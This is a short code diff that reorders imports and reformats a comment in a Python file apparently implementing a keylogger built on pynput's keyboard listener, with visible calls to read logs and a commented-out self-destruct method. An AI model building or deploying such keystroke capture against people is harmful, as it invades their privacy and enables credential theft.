@@ -1,7 +1,8 @@
-from pynput.keyboard import Listener
-import os 
-import time
+import os
 import threading
+import time
+
+from pynput.keyboard import Listener
 
 
 class Keylogger():
@@ -64,5 +65,5 @@ if __name__=='__main__':
         time.sleep(10)
         logs = keylog.read_logs()
         print(logs)
-    #keylog.self_destruct()
+    # keylog.self_destruct()
     t.join()
